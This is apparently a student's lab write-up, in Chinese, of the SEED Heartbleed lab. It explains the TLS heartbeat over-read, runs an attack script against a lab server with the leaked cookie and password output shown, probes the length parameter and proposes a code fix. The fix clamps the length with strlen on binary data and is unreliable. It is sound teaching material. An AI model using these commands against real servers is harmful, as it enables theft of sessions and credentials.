# 实验准备

设置两个 VM: 

- 攻击者机器
  - 修改/etc/hosts 文件将服务器名映射到服务器 VM 的 IP 地址，在/etc/hosts 中搜索`127.0.0.1   www.heartbleedlabelgg.com`，将承载ELGG应用程序的服务器VM的实际IP地址替换掉127.0.0.1
- 受害者服务器

# Heartbleed漏洞分析

OpenSSL 库中的一个漏洞，受影响的 OpenSSL 版本范围从1.0.1到1.0.1 f，在一些新版本的OpenSSL中无法复现

心跳协议是如何工作的。心跳协议由两种消息类型组成: HeartbeatRequest 包和 HeartbeatResponse 包。客户端向服务器发送一个 HeartbeatRequest 数据包。当服务器接收到它时，它会发回 HeartbeatResponse 数据包中接收到的消息的副本。目标是保持连接活跃

心脏出血攻击是基于心跳请求的。这个请求只是向服务器发送一些数据，服务器将把这些数据复制到它的响应数据包中，这样所有的数据都会得到回显

**在正常情况下，假设请求包含3个字节的数据“ ABC”，因此长度字段的值为3。服务器将把数据放在内存中，并从数据的开头复制3个字节到它的响应数据包。在攻击场景中，请求可能包含3个字节的数据，但长度字段可能是1003。当服务器构造它的响应数据包时，它从数据的开始进行复制(即“ ABC”) ，但是它复制的是1003个字节，而不是3个字节。这额外的1000种类型显然不是来自请求数据包; 它们来自服务器的私有内存，并且它们可能包含其他用户的信息、密钥和密码**

# Task 1: Launch the Heartbleed Attack

攻击步骤：

- 访问 https://www.heartbleedlabelgg.com

- 以管理员身份登录：admin ：seedelgg
- 添加boby为friend，并给他发送私人信息

多次运行攻击的回显如下

可以看出泄露了cookie、username、密码等关键信息

```
# ./attack.py www.heartbleedlabelgg.com

defribulator v1.20
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: www.heartbleedlabelgg.com:443, 1 times
Sending Client Hello for TLSv1.0
Analyze the result....
Analyze the result....
Analyze the result....
Analyze the result....
Received Server Hello for TLSv1.0
Analyze the result....

WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 1 of 1
##################################################################

.@.AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOABC...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.heartbleedlabelgg.com/profile/boby
Cookie: Elgg=vt3bsst6tb3ov6njhj7kcijn42
Connection: keep-alive
If-None-Match: "1449721729"

..*.......a.3v.O.akf.........b3ov6njhj7kcijn42
Connection: keep-alive

_..@?.
..2....{ d..................=1670072367&username=admin&password=seedlggT.;.8A.K..VY."...."

```

# Task 2: Find the Cause of the Heartbleed Vulnerability

比较良性数据包和攻击者代码发送的恶意数据包的结果，以找出心脏出血漏洞的根本原因

> 当 Heartbeat 请求数据包到来时，服务器将解析数据包以获得有效负载和有效负载长度值(如图1所示)。这里，有效负载只是一个3字节的字符串“ ABC”，有效负载长度值正好是3。服务器程序将盲目地从请求数据包中获取这个长度值。然后，它通过指向存储“ ABC”的内存并将负载长度字节复制到响应负载来构建响应数据包。这样，响应数据包将包含一个3字节的字符串“ ABC”。我们可以启动 HeartBleed 攻击，将有效负载长度字段设置为1003。在构建响应数据包时，服务器将再次盲目地采用这个 Payload 长度值。这一次，服务器程序将指向字符串“ ABC”，并将1003字节作为有效负载从内存复制到响应数据包。除了字符串“ ABC”之外，额外的1000字节被复制到响应数据包中，这些数据包可以是内存中的任何内容，比如机密活动、日志信息、密码等等

图示：

![](https://raw.githubusercontent.com/LaPhilosophie/seedlab/main/Heartbleed%20Attack%20Lab/images/The%20Heartbleed%20Attack%20Communication.png)

![](https://raw.githubusercontent.com/LaPhilosophie/seedlab/main/Heartbleed%20Attack%20Lab/images/The%20Benign%20Heartbeat%20Communication.png)

通过命令行参数控制有效载荷长度值，该参数默认是0x4000

```
$./attack.py www.heartbleedlabelgg.com -l 0x015B
$./attack.py www.heartbleedlabelgg.com --length 83
```

Question 2.1: As the length variable decreases, what kind of difference can you observe?

回返的信息长度减少

Question 2.2: As the length variable decreases, there is a boundary value for the input length vari-
able. At or below that boundary, the Heartbeat query will receive a response packet without attaching
any extra data (which means the request is benign). Please find that boundary length. You may need
to try many different length values until the web server sends back the reply without extra data. To
help you with this, when the number of returned bytes is smaller than the expected length, the pro-
gram will print "Server processed malformed Heartbeat, but did not return
any extra data."

边界值：22

回显形式1：

> WARNING: www.heartbleedlabelgg.com:443 returned more data than it should - server is vulnerable!

回显形式2：

> Server processed malformed heartbeat, but did not return any extra data.

# Task 3: Countermeasure and Bug Fix

使用`sudo apt-get update`将 OpenSSL 库更新到最新版本，发现之后的攻击无效

Heartbeat request/response 包格式如下：

 ```c
struct {
    HeartbeatMessageType type; // 1 byte: request or the response
    uint16 payload_length; // 2 byte: the length of the payload
    opaque payload[HeartbeatMessage.payload_length];
    opaque padding[padding_length];
} HeartbeatMessage;
 ```

- type是类型信息
- payload_length是有效负载长度

- payload是实际的有效负载
- 填充字段

> 有效负载的大小应该与有效负载长度字段中的值相同，但是在攻击场景中，有效负载长度可以设置为不同的值

导致bug的语句是`memcpy(bp, pl, payload); `，其中，bp指向buffer，pl指向payload，它会将payload长度的内容从pl复制到bp（正如Alice所说），而这并没有做边界检查

在memcpy之前加上以下语句以修订：

```c
payload = payload_length > strlen(pl) ? strlen(pl) : payload_length ;
```

